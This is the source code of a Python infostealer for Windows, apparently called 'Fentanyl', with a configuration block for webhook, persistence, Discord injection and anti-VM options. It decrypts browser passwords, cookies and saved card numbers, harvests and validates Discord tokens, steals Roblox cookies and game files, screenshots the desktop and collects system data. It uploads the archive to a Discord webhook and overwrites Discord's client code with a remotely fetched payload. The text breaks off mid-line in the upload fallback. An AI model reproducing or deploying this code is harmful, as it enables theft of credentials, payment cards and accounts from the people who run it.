import os,json,shutil,base64,sqlite3,zipfile,requests,subprocess,psutil,random,ctypes,sys,re,datetime,time,traceback
from threading import Thread
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
config = {
    ### Key:
    # Webhook: Webhook to send to discord.
    # Persist: Add to startup? (True/False, Bool)
    # Keep-Alive: Keep process running? (Will execute every hour, True/False, Bool)
    # Injection URL: Raw URL to injection payload
    # Inject: Inject payload into Discord? (True/False, Bool)
    # AntiVM: Protect against debuggers? (Recommended, True/False, Bool)
    # HideConsole: Hide the console? (Similar to PyInstallers -w/--noconsole option, but less detections, (True/False, Bool)
    # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
    # Black Screen: Make screen black? (True/False, Bool)
    # Error Message: Fake error text to display. (Leave Blank for None)
    'webhook': 'a',
    'persist': False,
    'keep-alive': False,
    'injection_url': 'url to injection (raw)',
    'inject': False,
    'hideconsole': False,
    'antivm': True,
    'force_admin': False,
    'black_screen': False,
    'error': False,
    'error_message': 'This application failed to start because MSCVDLL.dll is missing.\n\nPlease download the latest version of Microsoft C++ Compiler and try again.',
}
class functions(object):
    def getHeaders(self, token:str=None, content_type="application/json") -> dict:
        headers = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
        if token: headers.update({"Authorization": token})
        return headers
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f: local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception: return f'Failed to decrypt "{str(buff)}" | Key: "{str(master_key)}"'
    def fsize(self, path):
        path = internal.tempfolder + os.sep + path
        if os.path.isfile(path): size = os.path.getsize(path)/1024
        else:
            total = 0
            with os.scandir(path) as it:
                for entry in it:
                    if entry.is_file():
                        total += entry.stat().st_size
                    elif entry.is_dir():
                        total += self.fsize(entry.path)
            size = total/1024
        if size > 1024: size = "{:.1f} MB".format(size/1024)
        else: size = "{:.1f} KB".format(size)
        return size
    def gen_tree(self, path):
        ret = ""
        fcount = 0
        for dirpath, dirnames, filenames in os.walk(path):
            directory_level = dirpath.replace(path, "")
            directory_level = directory_level.count(os.sep)
            indent = "│ "
            ret += f"\n{indent*directory_level}📁 {os.path.basename(dirpath)}/"
            for n, f in enumerate(filenames):
                if f == f'Fentanyl-{os.getlogin()}.zip': continue
                indent2 = indent if n != len(filenames) - 1 else "└ "
                ret += f"\n{indent*(directory_level)}{indent2}{f} ({self.fsize((os.path.basename(dirpath)+os.sep if dirpath.split(os.sep)[-1] != internal.tempfolder.split(os.sep)[-1] else '')+f)})"
                fcount += 1
        return ret, fcount
    def system(self, action):
        return '\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())
class internal:
    tempfolder = None
    stolen = False
class ticks(functions, internal):
    def __init__(self,useless):
        del useless
        if config.get('error'): Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, config.get('error_message'), os.path.basename(sys.argv[0]), 0x1 | 0x10)).start()
        try: admin = ctypes.windll.shell32.IsUserAnAdmin()
        except Exception: admin = False
        if not admin and config['force_admin'] and '--nouacbypass' not in sys.argv: self.forceadmin()
        self.webhook = config.get('webhook')
        self.exceptions = []
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        dirs = [
            self.appdata,
            self.roaming,
            os.getenv('temp'),
            'C:\\Users\\Public\\Public Music',
            'C:\\Users\\Public\\Public Pictures',
            'C:\\Users\\Public\\Public Videos',
            'C:\\Users\\Public\\Public Documents',
            'C:\\Users\\Public\\Public Downloads',
            os.getenv('userprofile'),
            os.getenv('userprofile') + '\\Documents',
            os.getenv('userprofile') + '\\Music',
            os.getenv('userprofile') + '\\Pictures',
            os.getenv('userprofile') + '\\Videos'
        ]
        while True:
            rootpath = random.choice(dirs)
            if os.path.exists(rootpath):
                self.tempfolder = os.path.join(rootpath,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
                break
        internal.tempfolder = self.tempfolder

        self.browserpaths = {
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data',
            'Amigo': self.appdata + r'\\Amigo\\User Data',
            'Torch': self.appdata + r'\\Torch\\User Data',
            'Kometa': self.appdata + r'\\Kometa\\User Data',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data',
            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data',
            'Iridium': self.appdata + r'\\Iridium\\User Data',
            'Chromium': self.appdata + r'\\Chromium\\User Data'
        }
        self.stats = {
            'passwords': 0,
            'tokens': 0,
            'phones': 0,
            'addresses': 0,
            'cards': 0,
            'cookies': 0
        }
        try:
            os.makedirs(os.path.join(self.tempfolder), 0x1ED, exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x2)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x4)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x256)
        except Exception: self.exceptions.append(traceback.format_exc())
        os.chdir(self.tempfolder)
        if config.get('persist') and not self.stolen: Thread(target=self.persist).start()
        if config.get('inject'): Thread(target=self.injector).start()
        self.tokens = []
        self.robloxcookies = []
        self.files = ""
        
        threads = [Thread(target=self.screenshot),Thread(target=self.grabMinecraftCache),Thread(target=self.grabGDSave),Thread(target=self.tokenRun),Thread(target=self.grabRobloxCookie),Thread(target=self.getSysInfo)]
        for plt, pth in self.browserpaths.items(): threads.append(Thread(target=self.grabBrowserInfo,args=(plt,pth)))
        for thread in threads: thread.start()
        for thread in threads: thread.join()
        
        if self.exceptions:
            with open(self.tempfolder+'\\Exceptions.txt','w',encoding='utf-8') as f:
                f.write('\n'.join(self.exceptions))

        self.SendInfo()

        shutil.rmtree(self.tempfolder)
        if config.get('black_screen'): self.system('start ms-cxh-full://0')
    def tokenRun(self):
        self.grabTokens()
        self.neatifyTokens()
    def getSysInfo(self):
            with open(self.tempfolder+f'\\PC Info.txt', "w", encoding="utf8", errors='ignore') as f:
                try: cpu = self.system(r'wmic cpu get name').splitlines()[1]
                except Exception: cpu = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: gpu = self.system(r'wmic path win32_VideoController get name').splitlines()[1]
                except Exception: gpu = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: screensize = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
                except Exception: screensize = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: refreshrate = self.system(r'wmic path win32_VideoController get currentrefreshrate').splitlines()[1]
                except Exception: refreshrate = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: osname = 'Windows ' + self.system(r'wmic os get version').splitlines()[1]
                except Exception: osname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: systemslots = self.system(r'wmic systemslot get slotdesignation,currentusage,description,status')
                except Exception: systemslots = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: processes = self.system(r'tasklist')
                except Exception: processes = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: installedapps = '\n'.join(self.system(r'powershell Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName').splitlines()[3:])
                except Exception: installedapps = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: path = self.system(r'set').replace('=',' = ')
                except Exception: path = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: buildmnf = self.system(r'wmic bios get manufacturer').splitlines()[1]
                except Exception: buildmnf = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: modelname = self.system(r'wmic csproduct get name').splitlines()[1]
                except Exception: modelname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: hwid = self.system(r'wmic csproduct get uuid').splitlines()[1]
                except Exception: hwid = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: avlist = ', '.join(self.system(r'wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayname').splitlines()[1:])
                except Exception: avlist = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: username = os.getlogin()
                except Exception: username = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: pcname = self.system(r'hostname')
                except Exception: pcname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: productinfo = self.getProductValues()
                except Exception: productinfo = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: buildname = productinfo[0]
                except Exception: buildname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: windowskey = productinfo[1]
                except Exception: windowskey = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
                except Exception: ram = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
                except Exception: disk = 'N/A'; self.exceptions.append(traceback.format_exc())
                sep = '='*40
                f.write(f'''{sep}
                HARDWARE 
{sep}

CPU: {cpu}
GPU: {gpu}

RAM: {ram} GB
Disk Size: {disk} GB

PC Manufacturer: {buildmnf}
Model Name: {modelname}

Screen Info:
Resolution: {screensize}
Refresh Rate: {refreshrate}Hz

System Slots:
{systemslots}

{sep}
                   OS
{sep}

Username: {username}
PC Name: {pcname}

Build Name: {osname}
Edition: {buildname}
Windows Key: {windowskey}
HWID: {hwid}
Antivirus: {avlist}

{sep}
                  PATH
{sep}

{path}

{sep}
             INSTALLED APPS
{sep}

{installedapps}

{sep}
            RUNNING PROCESSES
{sep}

{processes}
''')

    def checkToken(self, tkn, source):
        try:
            r = requests.get(self.baseurl, headers=self.getHeaders(tkn))
            if r.status_code == 200 and tkn not in [token[0] for token in self.tokens]:
                self.tokens.append((tkn, source))
                self.stats['tokens'] += 1
        except Exception: self.exceptions.append(traceback.format_exc())
    def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            with open(bd, 'r', encoding="utf8", errors='ignore') as f:
                txt = f.read()
                content = txt.replace('api/webhooks', 'api/nethooks')
            with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
    def grabBrowserInfo(self, platform, path):
        if os.path.exists(path):
            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.formatted_cookies = ''
            sep = '='*40
            fname = lambda x: f'\\{platform} Info ({x}).txt'
            formatter = lambda p, c, h, m: f'Browser: {platform}\n\n{sep}\n               PASSWORDS\n{sep}\n\n{p}\n{sep}\n                COOKIES\n{sep}\n\n{c}\n{sep}\n                HISTORY\n{sep}\n\n{h}\n{sep}\n               OTHER INFO\n{sep}\n\n{m}'
            profiles = ['Default']
            for dir in os.listdir(path):
                if dir.startswith('Profile ') and os.path.isdir(dir): profiles.append(dir)
            if platform in [
                'Opera',
                'Opera GX',
                'Amigo',
                'Torch',
                'Kometa',
                'Orbitum',
                'CentBrowser',
                '7Star',
                'Sputnik',
                'Chrome SxS',
                'Epic Privacy Browser',
            ]:
                cpath = path + '\\Network\\Cookies'
                ppath = path + '\\Login Data'
                hpath = path + '\\History'
                wpath = path + '\\Web Data'
                mkpath = path + '\\Local State'
                fname = f'\\{platform} Info (Default).txt'
                threads = [
                    Thread(target=self.grabPasswords,args=[mkpath,platform,'Default',ppath]),
                    Thread(target=self.grabCookies,args=[mkpath,platform,'Default',cpath]),
                    Thread(target=self.grabHistory,args=[mkpath,platform,'Default',hpath]),
                    Thread(target=self.grabMisc,args=[mkpath,platform,'Default',wpath])
                ]
                for x in threads:
                    x.start()
                for x in threads:
                    x.join()
                try: self.grabPasswords(mkpath,fname,ppath); self.grabCookies(mkpath,fname,cpath); self.grabHistory(mkpath,fname,hpath); self.grabMisc(mkpath,fname,wpath)
                except Exception: self.exceptions.append(traceback.format_exc())
            else:
                for profile in profiles:
                    cpath = path + f'\\{profile}\\Network\\Cookies'
                    ppath = path + f'\\{profile}\\Login Data'
                    hpath = path + f'\\{profile}\\History'
                    wpath = path + f'\\{profile}\\Web Data'
                    mkpath = path + '\\Local State'
                    fname = f'\\{platform} Info ({profile}).txt'
                    threads = [
                        Thread(target=self.grabPasswords,args=[mkpath,platform,profile,ppath]),
                        Thread(target=self.grabCookies,args=[mkpath,platform,profile,cpath]),
                        Thread(target=self.grabHistory,args=[mkpath,platform,profile,hpath]),
                        Thread(target=self.grabMisc,args=[mkpath,platform,profile,wpath])
                    ]
                    for x in threads:
                        x.start()
                    for x in threads:
                        x.join()
            with open(self.tempfolder+f'\\{platform} Cookies ({profile}).txt', "w", encoding="utf8", errors='ignore') as m, open(self.tempfolder+fname, "w", encoding="utf8", errors='ignore') as f:
                if self.formatted_cookies:
                    m.write(self.formatted_cookies)
                else:
                    m.close()
                    os.remove(self.tempfolder+f'\\{platform} Cookies ({profile}).txt')
                
                if self.passwords_temp or self.cookies_temp or self.history_temp or self.misc_temp:
                    f.write(formatter(self.passwords_temp, self.cookies_temp, self.history_temp, self.misc_temp))
                else:
                    f.close()
                    os.remove(self.tempfolder+fname)
    def injector(self):
        self.bypassBetterDiscord()
        for dir in os.listdir(self.appdata):
            if 'discord' in dir.lower():
                discord = self.appdata+f'\\{dir}'
                disc_sep = discord+'\\'
                for _dir in os.listdir(os.path.abspath(discord)):
                    if re.match(r'app-(\d*\.\d*)*', _dir):
                        app = os.path.abspath(disc_sep+_dir)
                        for x in os.listdir(os.path.join(app,'modules')):
                            if x.startswith('discord_desktop_core-'):
                                inj_path = app+f'\\modules\\{x}\\discord_desktop_core\\'
                                if os.path.exists(inj_path):
                                    f = requests.get(config.get('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                                    with open(inj_path+'index.js', 'w', errors="ignore") as indexFile: indexFile.write(f)

    def getProductValues(self):
        try: wkey = self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
        except Exception: wkey = "N/A (Likely Pirated)"
        try: productName = self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName")
        except Exception: productName = "N/A"
        return [productName, wkey]
    def grabPasswords(self,mkp,bname,pname,data):
        self.passwords_temp = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_PASSWORDS.db'.replace(' ','_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(encrypted_password, master_key)
                if url != "":
                    self.passwords_temp += f"\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n"
                    self.stats['passwords'] += 1
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabCookies(self,mkp,bname,pname,data):
        self.cookies_temp = ''
        self.formatted_cookies = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_COOKIES.db'.replace(' ','_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    self.cookies_temp += f"\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n"
                    self.formatted_cookies += f"{host}	TRUE	/	FALSE	1708726694	{user}	{decrypted_cookie}\n"
                    self.stats['cookies'] += 1
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabHistory(self,mkp,bname,pname,data):
        self.history_temp = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_HISTORY.db'.replace(' ','_'))
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT title, url, visit_count, last_visit_time FROM urls")
            for r in cursor.fetchall()[::-1]:
                title = r[0]
                url = r[1]
                count = r[2]
                time = r[3]
                time_neat = str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=time))[:-7].replace('-','/')
                if url != "":
                    self.history_temp += f"\nURL: {title}\nTitle: {url}\nVisit Count: {count}\nLast Visited: {time_neat}\n"
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabMisc(self,mkp,bname,pname,data):
        self.misc_temp = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_WEBDATA.db'.replace(' ','_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT street_address, city, state, zipcode FROM autofill_profiles")
            for r in cursor.fetchall():
                Address = r[0]
                City = r[1]
                State = r[2]
                ZIP = r[3]
                if Address != "":
                    self.misc_temp += f"\nAddress: {Address}\nCity: {City}\nState: {State}\nZIP Code: {ZIP}\n"
                    self.stats['addresses'] += 1
            cursor.execute("SELECT number FROM autofill_profile_phones")
            for r in cursor.fetchall():
                Number = r[0]
                if Number != "":
                    self.misc_temp += f"\nPhone Number: {Number}\n"
                    self.stats['phones'] += 1
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for r in cursor.fetchall():
                Name = r[0]
                ExpM = r[1]
                ExpY = r[2]
                decrypted_card = self.decrypt_val(r[3], master_key)
                if decrypted_card != "":
                    self.misc_temp += f"\nCard Number: {decrypted_card}\nName on Card: {Name}\nExpiration Month: {ExpM}\nExpiration Year: {ExpY}\n"
                    self.stats['cards'] += 1
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabRobloxCookie(self):
        try: self.robloxcookies.append(self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY"))
        except Exception: pass
        if self.robloxcookies:
            with open(self.tempfolder+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies: f.write(i+'\n')
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
            'Amigo': self.appdata + r'\\Amigo\\User Data',
            'Torch': self.appdata + r'\\Torch\\User Data',
            'Kometa': self.appdata + r'\\Kometa\\User Data',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\<PROFILE>',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\<PROFILE>',
            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data\\<PROFILE>',
            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\<PROFILE>',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\<PROFILE>',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\<PROFILE>',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\<PROFILE>',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\<PROFILE>',
            'Chromium': self.appdata + r'\\Chromium\\User Data\\<PROFILE>'
        }
        for source, path in paths.items():
            if not os.path.exists(path.replace('<PROFILE>','')): continue
            if "discord" not in path:
                profiles = ['Default']
                for dir in os.listdir(path.replace('<PROFILE>','')):
                    if dir.startswith('Profile '):
                        profiles.append(dir)
                for profile in profiles:
                    newpath = path.replace('<PROFILE>',profile) + r'\\Local Storage\\leveldb\\'
                    for file_name in os.listdir(newpath):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                        for line in [x.strip() for x in open(f'{newpath}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}", line): self.checkToken(token, f'{source} ({profile})')
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line): token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State')); self.checkToken(token, source)
        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'): continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line): self.checkToken(token, 'Firefox')
    def neatifyTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt", "w+", encoding="utf8", errors='ignore')
        for info in self.tokens:
            token = info[0]
            j = requests.get(self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partner, "
            if (flags == 4): badges += "Hypesquad Event, "
            if (flags == 8): badges += "Green Bughunter, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "Gold BugHunter, "
            if (flags == 131072): badges += "Verified Bot Developer, "
            if (badges == ""): badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
            try: nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            except Exception: self.exceptions.append(traceback.format_exc())
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            try: billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            except Exception: self.exceptions.append(traceback.format_exc())
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nPlatform: {info[1]}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.seek(0)
        content = f.read()
        f.close()
        if not content:
            os.remove(self.tempfolder+"\\Discord Info.txt")
    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None, 
            include_layered_windows=False, 
            all_screens=True, 
            xdisplay=None
        )
        image.save(self.tempfolder + "\\Screenshot.png")
        image.close()

    def grabMinecraftCache(self):
        if not os.path.exists(os.path.join(self.roaming, '.minecraft')): return
        minecraft = os.path.join(self.tempfolder, 'Minecraft Cache')
        os.makedirs(minecraft, exist_ok=True)
        mc = os.path.join(self.roaming, '.minecraft')
        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']

        for _file in to_grab:
            if os.path.exists(os.path.join(mc, _file)):
                shutil.copy2(os.path.join(mc, _file), minecraft + os.sep + _file)
    def grabGDSave(self):
        if not os.path.exists(os.path.join(self.appdata, 'GeometryDash')): return
        gd = os.path.join(self.tempfolder, 'Geometry Dash Save')
        os.makedirs(gd, exist_ok=True)
        gdf = os.path.join(self.appdata, 'GeometryDash')
        to_grab = ['CCGameManager.dat']

        for _file in to_grab:
            if os.path.exists(os.path.join(gdf, _file)):
                shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)
    def SendInfo(self):
        wname = self.getProductValues()[0]
        wkey = self.getProductValues()[1]
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("https://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except Exception: self.exceptions.append(traceback.format_exc())
        _zipfile = os.path.join(self.tempfolder, f'Fentanyl-{os.getlogin()}.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.tempfolder)
        for dirname, _, files in os.walk(self.tempfolder):
            for filename in files:
                if filename == f'Fentanyl-{os.getlogin()}.zip': continue
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        self.files, self.fileCount = self.gen_tree(self.tempfolder)
        self.fileCount =  f"{self.fileCount} File{'s' if self.fileCount != 1 else ''} Found: "
        embed = {
            "username": f"{os.getlogin()} | Fentanyl",
            "content": "@everyone",
            "avatar_url":"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png",
            "embeds": [
                {
                    "author": {
                        "name": "Fentanyl strikes again!",
                        "url": "https://youareanidiot.cc",
                        "icon_url": "https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png"
                    },
                    "description": f'**{os.getlogin()}** ran Fentanyl.\n\n**Computer Name:** {os.getenv("COMPUTERNAME")}\n**{wname}:** {wkey if wkey else "No Product Key!"}\n**IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n**City:** {city}\n**Region:** {region}\n**Country:** {country}\n[Google Maps Location]({googlemap})\n```ansi\n\u001b[32m{self.fileCount}\u001b[35m{self.files}``````ansi\n\u001b[32mStats:\n\u001b[35mPasswords Found: {self.stats["passwords"]}\nCookies Found: {self.stats["cookies"]}\nPhone Numbers Found: {self.stats["phones"]}\nCards Found: {self.stats["cards"]}\nAddresses Found: {self.stats["addresses"]}\nTokens Found: {self.stats["tokens"]}\nTime: {"{:.2f}".format(time.time() - self.starttime)}s```',
                    "color": 0x00FFFF,
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png"
                    },
                     "footer": {
                        "text": "Fentanyl Strikes Again!",
                        "icon_url": "https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png"
                    }
                }
            ]
        }
        fileEmbed = {
            "username": f"{os.getlogin()} | Fentanyl",
            "avatar_url":"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png"
        }
        with open(_zipfile,'rb') as infozip:
            requests.post(self.webhook, json=embed)
            if requests.post(self.webhook, data=fileEmbed, files={'upload_file': infozip}).status_code == 413:
                infozip.seek(0)
                server = requests.get('https://api.gofile.io/getServer').json()['data']['server']
                link = requests.post(
